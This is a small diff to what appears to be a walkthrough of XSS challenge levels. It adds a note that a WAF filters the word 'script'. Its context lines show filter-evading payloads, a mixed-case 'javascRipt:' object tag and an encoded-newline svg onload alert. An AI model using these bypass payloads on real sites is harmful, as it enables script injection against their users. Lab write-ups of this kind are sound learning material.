@@ -7,6 +7,8 @@
 ```
 ## Level 2
 
+- WAF looking for "script"
+
 ```html
 <object data="javascRipt:alert()">
 ```
@@ -18,7 +20,6 @@
 ```html
 %0A<svg/onload=alert()>
 ```
-
 
 ## Level 4
 
